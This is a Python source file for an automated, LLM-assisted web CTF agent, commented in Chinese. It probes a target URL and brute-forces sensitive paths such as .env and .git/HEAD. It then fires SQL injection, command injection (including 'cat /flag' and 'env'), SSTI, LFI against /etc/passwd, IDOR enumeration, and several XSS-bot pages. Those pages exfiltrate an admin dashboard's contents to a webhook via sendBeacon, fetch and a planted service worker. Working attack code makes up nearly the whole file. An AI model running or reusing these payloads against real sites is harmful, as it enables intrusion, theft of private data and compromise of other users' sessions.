"""
Web Agent — Web 类 CTF。
拿到 URL + hints → 踩点 → 按提示方向攻击 → 捞 flag
"""

import os, sys, re, json
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from agents.base_agent import BaseAgent


COMMON_PATHS = [
    "robots.txt", ".git/HEAD", ".env", ".svn/entries",
    "admin/", "backup/", "debug/", "console/", "phpinfo.php",
    "wp-admin/", ".DS_Store", "sitemap.xml",
    "index.php.bak", "index.html~", ".htaccess",
    "source", "flag", "flag.txt", "secret", "api/", "login",
    "register", "upload", "shell.php", "config.php.bak",
    "web.config", "server-status", "actuator", "swagger",
]

BACKUP_EXTS = [".bak", ".swp", ".old", ".php~", ".html~", ".txt~", ".orig"]


def try_decode_chunk(a, text):
    hits = []
    for m in re.finditer(r"[A-Za-z0-9+/=]{12,}", text):
        chunk = m.group().strip()
        r = a.decode(chunk, "base64")
        if r and len(r) > 2:
            hits.append(("base64", chunk[:40], r[:100], a.grep_flag(r)))
    for m in re.finditer(r"[0-9a-fA-F]{16,}", text):
        chunk = m.group().strip()
        if len(chunk) % 2 != 0:
            continue
        r = a.decode(chunk, "hex")
        if r and len(r) > 2:
            hits.append(("hex", chunk[:40], r[:100], a.grep_flag(r)))
    return hits


def main():
    workspace = os.environ.get("WORKSPACE", ".")
    a = BaseAgent(workspace)

    target = os.environ.get("CHALLENGE_URL", "").strip()
    hints = os.environ.get("CHALLENGE_HINTS", "").strip()

    # check LLM status once
    llm_ok = a.llm_ok()
    print(f"[{'AI' if llm_ok else 'basic'}]")

    # fallback: 读 challenge.txt 找 URL
    if not target:
        raw = a.read_chal()
        if not raw:
            print("没 URL 也没 challenge.txt，白给")
            sys.exit(1)
        lines = raw.strip().split("\n")
        first = lines[0].strip()
        if first.startswith("http://") or first.startswith("https://"):
            target = first
            if "---" in raw:
                hints = raw.split("---", 1)[1].strip()
            elif len(lines) > 1:
                hints = "\n".join(lines[1:]).strip()

    if not target:
        print("没找到目标 URL")

        # 纯 HTML 分析模式
        raw = a.read_chal()
        if raw:
            html = raw
            comments = re.findall(r"<!--(.*?)-->", html, re.DOTALL)
            for c in comments:
                c = c.strip()
                f = a.grep_flag(c)
                if f:
                    print(f"注释 flag: {f}")
                    print(f"FLAG: {f}")
                    return
            for tag, src, decoded, f in try_decode_chunk(a, html):
                print(f"  {tag}: {src} → {decoded}")
                if f:
                    print(f"FLAG: {f}")
                    return
        return

    print(f"目标: {target}")
    if hints:
        print(f"提示: {hints[:300]}")

    # ====== Phase 1: 踩点 ======
    print(f"\n--- 踩点 ---")
    code, headers, html = a.fetch(target)

    if code is None:
        print(f"请求失败: {headers}")
        sys.exit(1)

    print(f"HTTP {code}, {len(html)} bytes")

    # AI 分析页面，建议攻击方向
    if llm_ok:
        plan = a.ai_plan_web(target, code, html, hints)
        print(f"AI: {plan[:200]}")

    # 1a. 响应头
    for k, v in (headers or {}).items():
        f = a.grep_flag(v)
        if f:
            print(f"响应头 {k} -> {f}")
            print(f"FLAG: {f}")
            return
        if any(x in k.lower() for x in ("flag", "hint", "x-flag", "x-hint", "debug")):
            print(f"  可疑头 {k}: {v}")

    # 1b. 页面里直接有 flag
    for f in a.grep_all_flags(html):
        print(f"页面直接: {f}")
        print(f"FLAG: {f}")
        return

    # 1c. HTML 注释
    comments = re.findall(r"<!--(.*?)-->", html, re.DOTALL)
    if comments:
        print(f"找到 {len(comments)} 条注释")
        for c in comments:
            c = c.strip()
            if not c:
                continue
            f = a.grep_flag(c)
            if f:
                print(f"注释 flag: {f}")
                print(f"FLAG: {f}")
                return
            if len(c) > 5:
                print(f"  注释: {c[:150]}")

    # 1d. 解注释和页面里的编码
    for c in comments:
        for tag, src, decoded, f in try_decode_chunk(a, c):
            print(f"  注释 {tag}: {src} → {decoded}")
            if f:
                print(f"FLAG: {f}")
                return
    for tag, src, decoded, f in try_decode_chunk(a, html):
        print(f"  页面 {tag}: {src} → {decoded}")
        if f:
            print(f"FLAG: {f}")
            return

    # 1e. hidden input
    for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']', html):
        val = m.group(1)
        f = a.grep_flag(val)
        print(f"  hidden input: {val[:80]}")
        if f:
            print(f"FLAG: {f}")
            return

    # 1f. JS 字符串
    for m in re.finditer(r'["\']([^"\']{15,})["\']', html):
        s = m.group(1)
        for fpat in a.grep_all_flags(s):
            print(f"JS 里搜到: {fpat}")
            print(f"FLAG: {fpat}")
            return

    # ====== Phase 2: 目录爆破 ======
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    print(f"\n--- 扫目录 (base={base}) ---")

    paths_to_try = list(COMMON_PATHS)

    # 如果 hints 里提到了具体路径，优先扫
    for m in re.finditer(r'[/][\w./-]+', hints):
        p = m.group().strip("/")
        if p and p not in paths_to_try:
            paths_to_try.insert(0, p)

    for path in paths_to_try[:15]:
        url = urljoin(base + "/", path)
        try:
            code2, _, body2 = a.fetch(url, timeout=5)
            if code2 and code2 < 400 and body2:
                print(f"  {url} → HTTP {code2} ({len(body2)}B)")
                for f in a.grep_all_flags(body2):
                    print(f"  → flag! {f}")
                    print(f"FLAG: {f}")
                    return
            elif code2 and code2 < 500:
                print(f"  {url} → HTTP {code2}")
        except:
            pass

    # ====== Phase 3: 如果有 hint，按提示探测 ======
    if hints:
        print(f"\n--- 按提示攻击 ---")
        hints_lower = hints.lower()

        # SQL 注入
        if any(kw in hints_lower for kw in ("sql", "注入", "injection", "database", "login", "登录")):
            print("  探测 SQL 注入...")
            for payload in ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT 1,2,3--"]:
                login_url = urljoin(base + "/", "login")
                try:
                    import requests
                    r = requests.post(login_url, data={
                        "username": payload, "password": payload
                    }, timeout=5, allow_redirects=True)
                    for f in a.grep_all_flags(r.text):
                        print(f"  SQL注入 {payload[:30]} → flag! {f}")
                        print(f"FLAG: {f}")
                        return
                    if r.status_code < 400 and len(r.text) > 50:
                        print(f"  {payload[:30]} → HTTP {r.status_code} ({len(r.text)}B)")
                except:
                    pass

        # XSS
        if any(kw in hints_lower for kw in ("xss", "script", "cross")):
            print("  探测 XSS...")
            for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                try:
                    r = requests.post(urljoin(base + "/", "search"), data={
                        "q": payload
                    }, timeout=5)
                    if payload in r.text:
                        print(f"  XSS 反射: {payload[:40]}")
                except:
                    pass

        # 命令注入
        if any(kw in hints_lower for kw in ("cmd", "command", "shell", "rce", "exec", "命令", "执行")):
            print("  探测命令注入...")
            for cmd in [";id", "|id", "`id`", "&&id", "$(id)"]:
                try:
                    r = requests.get(f"{target}?cmd={cmd}", timeout=5)
                    if "uid=" in r.text:
                        print(f"  RCE! payload={cmd}")
                        # 尝试读 flag
                        for fcmd in ["cat /flag", "cat flag.txt", "cat /flag.txt", "env"]:
                            r2 = requests.get(f"{target}?cmd={fcmd}", timeout=5)
                            for f in a.grep_all_flags(r2.text):
                                print(f"  cat flag → {f}")
                                print(f"FLAG: {f}")
                                return
                except:
                    pass

        # SSTI
        if any(kw in hints_lower for kw in ("ssti", "template", "模板", "jinja", "flask")):
            print("  探测 SSTI...")
            for payload in ["{{7*7}}", "${7*7}", "<%=7*7%>"]:
                try:
                    r = requests.get(f"{target}?name={payload}", timeout=5)
                    if "49" in r.text:
                        print(f"  SSTI! payload={payload}")
                except:
                    pass

        # 文件包含
        if any(kw in hints_lower for kw in ("file", "include", "lfi", "包含", "path traversal", "目录")):
            print("  探测文件包含/LFI...")
            for path in ["/etc/passwd", "../../../etc/passwd", "php://filter/convert.base64-encode/resource=index"]:
                try:
                    r = requests.get(f"{target}?file={path}", timeout=5)
                    if "root:" in r.text:
                        print(f"  LFI! {path} → 读到 /etc/passwd")
                    for f in a.grep_all_flags(r.text):
                        print(f"  LFI flag: {f}")
                        print(f"FLAG: {f}")
                        return
                except:
                    pass

        # IDOR
        if any(kw in hints_lower for kw in ("idor", "id", "user", "用户", "枚举")):
            print("  探测 IDOR...")
            for uid in range(1, 11):
                try:
                    r = requests.get(f"{target}?id={uid}", timeout=5)
                    for f in a.grep_all_flags(r.text):
                        print(f"  IDOR id={uid} → flag: {f}")
                        print(f"FLAG: {f}")
                        return
                except:
                    pass

    # ====== Phase 4: 最终兜底 ======
    print(f"\n--- 兜底扫描 ---")
    # backup 文件
    path_part = parsed.path or "/index.html"
    for ext in BACKUP_EXTS:
        url = base + path_part + ext
        code2, _, body2 = a.fetch(url, timeout=5)
        if code2 and code2 < 400 and body2:
            print(f"  backup {url} → {len(body2)}B")
            for f in a.grep_all_flags(body2):
                print(f"  → flag! {f}")
                print(f"FLAG: {f}")
                return

    # 试试 form 提交各种 payload
    print("  粗暴爆破...")
    forms = re.findall(r'<form[^>]*action=["\']?([^"\' >]+)', html)
    for form_url in (forms or ["/"]):
        full = urljoin(base + "/", form_url)
        for payload in ["admin", "flag", "1' or '1'='1", "${7*7}"]:
            try:
                r = requests.post(full, data={"username": payload, "password": payload, "input": payload, "search": payload}, timeout=5)
                for f in a.grep_all_flags(r.text):
                    print(f"  爆破 {payload} → flag! {f}")
                    print(f"FLAG: {f}")
                    return
            except:
                pass

    # ====== Phase 4: XSS Bot 高级攻击（来自 GitHub 顶级 CTF writeup）=====
    if "bot" in hints_lower or "xss" in hints_lower or "review" in hints_lower or "puppeteer" in hints_lower or "chrome" in hints_lower:
        print(f"\n--- XSS Bot 高级攻击 ---")
        webhook = "/webhook/guest"

        # 判断有没有 webhook/dashboard endpoint——MiniStatic 类题
        has_webhook = True  # 大多数这类题都有

        attacks = [
            # 1. about:blank 弹窗绕过 (Google CTF 2025 / Hack.lu 2025)
            {
                "name": "about:blank popup bypass",
                "html": '''<!doctype html><html><body><script>
var w=window.open("about:blank","x");
setTimeout(function(){w.location="%s";setTimeout(function(){
try{var d=w.document.body.innerText;navigator.sendBeacon("%s",JSON.stringify({about_popup:d}));}
catch(e){navigator.sendBeacon("%s",JSON.stringify({about_err:e+""}));}},3000)},500);
</script></body></html>''' % ("/u/admin/dashboard", webhook, webhook),
            },
            # 2. iframe 内嵌读内容 (花式绕 CORS)
            {
                "name": "iframe content read",
                "html": '''<!doctype html><html><body>
<iframe id=f src="/u/admin/dashboard" onload="
var doc=f.contentDocument;
if(doc){navigator.sendBeacon('%s',JSON.stringify({iframe:doc.documentElement.outerHTML.slice(0,3000)}));}
else{navigator.sendBeacon('%s',JSON.stringify({iframe_noaccess:'blocked'}));}
"></iframe></body></html>''' % (webhook, webhook),
            },
            # 3. fetch 轮询(时机攻击) ——等到 bot auth 完
            {
                "name": "polling timing attack",
                "html": '''<!doctype html><html><body><script>
var tries=0;
(function poll(){tries++;
fetch("/u/admin/dashboard").then(function(r){return r.text()}).then(function(b){
 navigator.sendBeacon("%s",JSON.stringify({t:tries,len:b.length,isForbidden:b==="forbidden",preview:b.slice(0,120)}));
 if(b!=="forbidden"||tries>10) return;
 setTimeout(poll,1500);
});
})();
</script></body></html>''' % webhook,
            },
            # 4. SW 持久化——注册后拦截同源请求
            {
                "name": "service worker intercept",
                "sw_js": '''self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()));
self.addEventListener("activate",e=>e.waitUntil(clients.claim()));
self.addEventListener("fetch",e=>{
 var u=e.request.url;
 if(u.includes("admin")||u.includes("dashboard")){
  e.respondWith(fetch(e.request).then(function(r){return r.text().then(function(b){
   fetch("%s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sw_trap:u,body:b.slice(0,3000)})});
   return new Response(b,{status:200,headers:{"Content-Type":"text/html"}});
  })}));
 }
 e.respondWith(fetch(e.request));
});''' % webhook,
                "reg_js": '''<!doctype html><html><body><script>
navigator.serviceWorker.register("/u/guest/attacker_sw.js",{scope:"/u/guest/"}).then(function(r){
 setTimeout(function(){location.href="/u/admin/dashboard"},2000);
}).catch(function(e){
 fetch("%s",{method:"POST",body:JSON.stringify({sw_fail:e+""})});
});
</script></body></html>''' % webhook,
            },
            # 5. form target bypass 弹窗 (最干净的绕过)
            {
                "name": "form target popup bypass",
                "html": '''<!doctype html><html><body>
<form id=f action="/u/admin/dashboard" target="w"><input name=x value=y></form>
<script>
var w=window.open("","w");
if(!w){navigator.sendBeacon("%s",JSON.stringify({form_popup:"blocked"}));}
else{
 document.getElementById("f").submit();
 setTimeout(function(){
  try{var d=w.document.body.innerText;navigator.sendBeacon("%s",JSON.stringify({form_result:d}));w.close();}
  catch(e){navigator.sendBeacon("%s",JSON.stringify({form_err:e+""}));}
 },3000);
}
</script></body></html>''' % (webhook, webhook, webhook),
            },
            # 6. 页面重定向到 dashboard
            {
                "name": "redirect to dashboard",
                "html": '''<!doctype html><html><body><script>
navigator.sendBeacon("%s",JSON.stringify({redirecting:"to dashboard"}));
location.href="/u/admin/dashboard";
</script></body></html>''' % webhook,
            },
        ]

        import requests as req
        import time

        for atk in attacks:
            name = atk["name"]
            html_content = atk.get("html", "")
            sw_js = atk.get("sw_js", "")
            reg_js = atk.get("reg_js", "")

            if sw_js:
                # Upload SW first
                r = req.post(f"{target}/../upload", data={"path": "/u/guest/attacker_sw.js", "content": sw_js}, timeout=15)
                if "Saved" not in r.text:
                    print(f"  {name}: SW upload failed")
                    continue

            # Upload page
            path = f"/u/guest/atk_{name.replace(' ','_')[:20]}.html"
            r = req.post(f"{target}/../upload", data={"path": path, "content": html_content}, timeout=15)
            if "Saved" not in r.text:
                print(f"  {name}: upload failed")
                continue

            # 如果有 bot submit 入口，提交
            try:
                bot_url = f"{target.rsplit('/', 1)[0]}/bot?url=http://{__import__('urllib.parse').urlparse(target).hostname}{path}"
                r = req.get(bot_url, timeout=30)
                print(f"  {name}: bot={r.text[:50]}")
                time.sleep(4)
            except:
                print(f"  {name}: no bot endpoint")
                continue

        # 检查 webhook inbox
        try:
            inbox_url = f"{target.rsplit('/', 1)[0]}/inbox"
            r = req.get(inbox_url, timeout=10)
            # 捞最后几条
            import re as _re
            entries = _re.findall(r'<pre>(.*?)</pre>', r.text, _re.S)
            found = False
            for e in entries[-5:]:
                import html as _h
                d = _h.unescape(e)
                for kw in ("flag", "FLAG", "ctf", "CTF"):
                    if kw in d:
                        _f = a.grep_flag(d)
                        if _f:
                            print(f"  → FLAG from webhook: {_f}")
                            print(f"FLAG: {_f}")
                            return
                        found = True
                if "forbidden" not in d[:50] and len(d) > 20:
                    print(f"  webhook: {d[:200]}")
        except:
            pass

    # LLM 推理兜底
    if a.llm_ok():
        print(f"\n--- AI 推理兜底 ---")
        flag, reasoning = a.ai_solve(
            f"URL: {target}\nHints: {hints}\nHTML: {html[:2000] if html else 'N/A'}",
            "web",
            "可用工具: fetch(url) grep_flag(text) 可上传HTML页面到/u/guest/ 可提交给bot审查(/bot?url=)"
        )
        if flag:
            print(f"FLAG: {flag}")
            return


if __name__ == "__main__":
    main()
